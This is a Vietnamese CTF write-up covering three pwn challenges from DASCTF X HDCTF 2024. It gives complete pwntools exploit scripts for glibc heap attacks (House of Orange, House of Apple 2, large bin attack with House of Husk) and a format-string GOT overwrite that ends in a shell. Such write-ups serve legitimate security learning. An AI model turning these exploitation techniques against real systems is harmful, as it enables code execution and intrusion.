---
title: DASCTF X HDCTF 2024 Open Competition
date: 2024-06-13 15-54-05
categories: [CTF]
tags: [pwn]
# image: /assets/image/htb.jpg
math: true
---

- Một giải khá hay giúp mình học được nhiều kĩ thuật mới.

## PRETTez

### Reference

- Bài này mình thấy khá hay, cảm ơn `0RAYS` đã chia sẻ solution.
- https://bbs.kanxue.com/thread-279588.htm#msg_header_h3_3
### Find bug

- Chương trình cho phép ta `malloc` 2 chunk 0x40, 0x90. Tuy nhiên, ta thấy có bug BOF `read(0, ptr, 0x90uLL);`

```c
__int64 __fastcall getInt(const char *a1)
{
  unsigned int v2; // [rsp+14h] [rbp-Ch] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("%s", a1);
  if ( (unsigned int)__isoc99_scanf("%d%*c", &v2) != 1 )
    exit(1);
  return v2;
}

__int64 __fastcall main(int a1, char **a2, char **a3)
{
  int Int; // eax
  char *v4; // rbx

  setvbuf(stdout, 0LL, 2, 0LL);
  sub_1242();
  while ( 1 )
  {
    while ( 1 )
    {
      puts("1. new\n2. show\n3. delete");
      Int = getInt(">> ");
      if ( Int != 3 )
        break;
      if ( ptr )
      {
        free(ptr);
        ptr = 0LL;
      }
      else
      {
        puts("Error!Nerver do that");
      }
    }
    if ( Int > 3 )
      break;
    if ( Int == 1 )
    {
      if ( ptr )
      {
        puts("Error!\nLook what you've done");
      }
      else
      {
        if ( (unsigned int)getInt("SIZE(1.0x40 ;2.0x90 )") == 1 )
          ptr = (char *)malloc(0x40uLL);
        else
          ptr = (char *)malloc(0x90uLL);
        printf("INPUT:");
        read(0, ptr, 0x90uLL);
        v4 = ptr;
        v4[strcspn(ptr, "\n")] = 0;
      }
    }
    else
    {
      if ( Int != 2 )
        break;
      if ( ptr )
        printf("Content: %s\n", ptr);
      else
        puts("Error!You may miss something");
    }
  }
  puts("It's PREETYez,Right?");
  return 0LL;
}
```

### Khai thác

- Ta có bug BOF nên ta có thể sử dụng kĩ thuật House of Oragne. Tuy nhiên chúng ta cần malloc 1 chunk lớn hơn chunk size top chunk nhưng chương trình đã cố định 2 size 0x40 và 0x90. Chú ý ở `setvbuf(stdout, 0LL, 2, 0LL); __isoc99_scanf("%d%*c", &v2)` thì do chương trình chỉ `setvbuf` cho stdout nên nếu scanf nhận khối lượng lớn (khoảng hơn 0x1000 byte), `scanf` sẽ call `malloc và free`
- Hướng khai thác sẽ là House of Orange -> (Unsorted bin > small bin > tcache) -> unlink small bin -> House of Apple 2
- small bin có thể được trở thành tcache được khi malloc lấy ra một chunk ở small bin thì các chunk cùng size còn lại trong small bin sẽ được đưa vào tcache

```c
if (in_smallbin_range (nb))
    {
      idx = smallbin_index (nb);
      bin = bin_at (av, idx);

      if ((victim = last (bin)) != bin)
        {
          bck = victim->bk;
      if (__glibc_unlikely (bck->fd != victim))
        malloc_printerr ("malloc(): smallbin double linked list corrupted");
          set_inuse_bit_at_offset (victim, nb);
          bin->bk = bck;
          bck->fd = bin;

          if (av != &main_arena)
        set_non_main_arena (victim);
          check_malloced_chunk (av, victim, nb);
#if USE_TCACHE
      /* While we're here, if we see other chunks of the same size,
         stash them in the tcache.  */
      size_t tc_idx = csize2tidx (nb);
      if (tcache != NULL && tc_idx < mp_.tcache_bins)
        {
          mchunkptr tc_victim;

          /* While bin not empty and tcache not full, copy chunks over.  */
          while (tcache->counts[tc_idx] < mp_.tcache_count
             && (tc_victim = last (bin)) != bin)
        {
          if (tc_victim != 0)
            {
              bck = tc_victim->bk;
              set_inuse_bit_at_offset (tc_victim, nb);
              if (av != &main_arena)
            set_non_main_arena (tc_victim);
              bin->bk = bck;
              bck->fd = bin;

              tcache_put (tc_victim, tc_idx); // !!!!!! 注意这里 放入了tcache内
                }
        }
        }
#endif
          void *p = chunk2mem (victim);
          alloc_perturb (p, bytes);
          return p;
        }
    }
```

#### Chuẩn bị

#### House of Orange

- [link](https://wan.io.vn/posts/House-of-Tangerine/)
- Ta sẽ overwrite top chunk, sử dụng scanf để malloc một chunk mới

```python
# house of orange
de(0xd59-1)
cr(1, b"a" * 0x48 + p64(0xd11))
sh(b'0'*(0x1000-1) + b'2')
de()
# leak libc
cr(1, b'a'*0x50)
sh()
p.recvuntil(b'a'*0x50)
libc.crress = u64(p.recv(6) + b'\0\0') - 0x219ce0
info("libc.crress " + hex(libc.crress))
de()
cr(1, b'a'*0x40 + flat(0, 0xcf1))
de()
# leak heap
cr(2, b'a')
de()
cr(1, b'aaaa')
de()
cr(2, b'aaaa')
de()
cr(1, b'a'*0x50)
sh()
p.recvuntil(b'a'*0x50)
heap = (u64(p.recvline(keepends=False).ljust(8, b'\0')) << 12)
info("heap " + hex(heap))
de()
```

#### unsorted bin -> small bin

##### House of Enherjar

- Mình thấy khá giống HOE vì ban đầu ta có các chunk như sau

![](/assets/2024-06-13-DASCTF%20X%20HDCTF%202024%20Open%20Competition/2024-06-15-20-30-22.png)

- Chúng ta sẽ tạo fake chunk ở 0x51, ghi đè size và bit inuse của chunk 0xa0 thành 0xd00. Set up các fake chunk để chương trình đưa vào unsorted bin

```python
cr(1, b"a" * 0x10 + p64(0) + p64(0x31) + p64(heap + 0x2c0)
   * 2 + b"a" * 0x10 + p64(0x30) + p64(0xd00))
de()
cr(2, b"a" * 0x60 + p64(0xa0) + p64(0x10) + p64(0x00) + p64(0x11))
de()
```

![](/assets/2024-06-13-DASCTF%20X%20HDCTF%202024%20Open%20Competition/2024-06-15-20-44-24.png)

- Nếu đúng, chúng ta có chunk 0xd31

![](/assets/2024-06-13-DASCTF%20X%20HDCTF%202024%20Open%20Competition/2024-06-15-20-53-32.png)

- Tiếp tục, ta sửa size từ 0xd31 về 0xa1 để đưa về small bin

![](/assets/2024-06-13-DASCTF%20X%20HDCTF%202024%20Open%20Competition/2024-06-15-21-15-25.png)

```c
cr(1, flat({
    0x10: 0,
    0x18: 0xa1,
    0x20: heap + 0x390,
    0x28: libc.crress + 0x219ce0,
}, filler=b"\x00"))
sh(b'0'*(0x1000-1) + b'2')
de()
```

![](/assets/2024-06-13-DASCTF%20X%20HDCTF%202024%20Open%20Competition/2024-06-15-21-16-18.png)

##### small bin -> tcache

- Ý tưởng để setup các chunk như sau

![](/assets/2024-06-13-DASCTF%20X%20HDCTF%202024%20Open%20Competition/2024-06-15-21-28-24.png)

```python
cr(1, flat({
    0x10: {
        0x00: 0,
        0x08: 0xa1,
        0x10: heap + 0x2c0,
        0x18: heap + 0x2c0 + 0x30,

        0x30: 0,
        0x38: 0xa1,
        0x40: heap + 0x2c0,
        0x48: heap + 0x2c0 + 0x50,

        0x50: 0,
        0x58: 0xa1,
        0x60: heap + 0x2c0 + 0x30,
        0x68: libc.crress + 0x219d70
    }
}
    , filler=b"\x00"))
de()
cr(2, b"aaaa")
de()
```

![](/assets/2024-06-13-DASCTF%20X%20HDCTF%202024%20Open%20Competition/2024-06-15-21-35-39.png)

##### House of apple 2

- Phần house of apple 2 khá khó hiểu nên mình sẽ viết một bài về HOA2

```python
_IO_list_all = libc.crress + 0x21a680
system = 0x50d60 + libc.crress

fake_file = heap + 0x2e0
# 见上文House of apple 2中解释
cr(1, b"a" * 0x10 + p64(0) + p64(0x71) + p64((heap + 0x2d0 + 0x70) ^ ((heap) >> 12)))
de()
# 这里是布置House of apple 2
cr(2, flat({
    0x0 + 0x10: b"  sh;",
    0x28 + 0x10: system,
    0x68: 0x71,
    0x70: _IO_list_all ^ ((heap) >> 12),
}, filler=b"\x00"))
de()
cr(2, flat({
    0xa0 - 0x60: fake_file - 0x10,
    0xd0 - 0x60: fake_file + 0x28 - 0x68,
    0xD8 - 0x60: libc.crress + 0x2160C0,  # jumptable
}, filler=b"\x00"))
de()
cr(2, p64(fake_file))
sleep(1)
p.sendline(b"0")
p.interactive()
```

## 签个到吧(pwn_3)

- Một dạng short form fmt. Một trick mà mình đọc được là mỗi % trong payload tương ứng với +1 offset. Ví dụ `%c%c%c%c%c%n == %6$n`
- Hướng khai thác của mình sẽ là overwrite `got exit` -> `main`
- Sau đó, mình sử dụng 2 con trỏ stack để ghi `got.exit` và `got.exit+3` lên stack
- Cuối cùng overwrite `exit` thành `system`

```python
#!/usr/bin/python3

from pwn import *

exe = ELF('pwn_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b* 0x401366
        b* 0x401361
        c
        ''')
        input()


if args.REMOTE:
    p = remote('node5.buuoj.cn', 26040)
else:
    p = process(exe.path)
GDB()
p.recvuntil(b'Gift addr: ')
stack = int(b'0x' + p.recvline(keepends=True), 16)
info("stack: " + hex(stack))
pa = b'%c'*12 + f'%{0x404018-12}c%n'.encode() + \
    f'%{0x100000-0x2ddd}c%46$hn'.encode()
# pa = b'%p'*5
sla(b"age: ", pa)
# leak libc
pa = b'%29$p'.ljust(0x100, b'\0')
sa(b"age: ", pa)
libc.address = int(p.recvuntil(b'Easy', drop=True), 16) - 0x24083
info("libc.address: " + hex(libc.address))
# setup
pa = f'%{0x404018+3}c%28$lln'.encode().ljust(0x100, b'\0')
sa(b"age: ", pa)
# overwrite exit -> one_gadget
one = libc.address + 0xe3b01
one1 = one >> 24
one2 = one & 0xffffff
pa = f'%{one2}c%82$n|%{one1-one2-1}c%52$n'.encode().ljust(0x100, b'\0')
sa(b"age: ", pa)
info("one1: " + hex(one1))
info("one1: " + hex(one))


p.interactive()
```

![](/assets/2024-06-13-DASCTF%20X%20HDCTF%202024%20Open%20Competition/2024-06-13-16-09-17.png)

## 最喜欢的一集 (pwn_4)

- Một bài heap sử dụng [large bin attack](https://github.com/shellphish/how2heap/blob/master/glibc_2.31/large_bin_attack.c) -> [house of husk](https://wan.io.vn/posts/House-of-Husk/)
- Tham khảo: https://programmerall.com/article/76072782318/

```python
#!/usr/bin/python3

from pwn import *

exe = ELF('pwn_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        # brva 0x1D98
        c
        ''')
        input()


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)
def cr(name,len, context):
    sla(b'choice:', '1')
    sla(b'name:', name)
    sla(b'length of your desciption: ', str(len))
    sla(b'content of your desciption: ', context)
def de(idx):
    sla(b'choice:', '2')
    sla(b'people:', str(idx))
def ed(idx,name, context):
    sla(b'choice:', '3')
    sla(b'people:', str(idx))
    sla(b'name of the people: ', name)
    sla(b'content of the desciption: ', context)
def sh(idx):
    sla(b'choice:', '4')
    sla(b'people: ', str(idx))


GDB()
# leak libc
cr(b'name0', 0x520, b'context0')    # 0
cr(b'wan', 0x500, b'wan')           # 1
de(0)
cr(b'wan', 0x540, b'wan')           # 2
sh(0)
libc.address = u64(p.recv(8)) - 0x1ed010
info("libc.address: " + hex(libc.address))
fun = libc.address + 0x1f1318
arg = libc.address + 0x1ed7b0

# đưa 3 vào large bin
cr(b'wan', 0x520, b'wan')           # 0
# chuẩn bị cho __printf_arginfo_table[0x73]
cr(b'wan', 0x510, p64(0xe3afe+libc.address)*0x73)   # 3
de(3)
cr(b'wan', 0x540, b'wan')           # 4
de(4)
# overwrite chunk_0[3] = __printf_arginfo_table,
# nếu large bin attack thành công, sẽ đưa được địa chỉ chunk_0 vào __printf_arginfo_table
ed(0,b'wan', p64(libc.address+0x1ed010)*3 + p64(arg-0x20))
# đưa 4 vào large bin
cr(b'wan', 0x540, b'wan')
# overwrite __printf_function_table để không NULL
sa(b'choice:', b'255')
p.sendlineafter(b"Maybe Do you like IU?\n",b"y")
p.sendlineafter(b"Give you a reward!\n",p64(fun) + b'w')
# sleep(0.5)

p.sendlineafter("choice:",b"1337")

p.interactive()
```
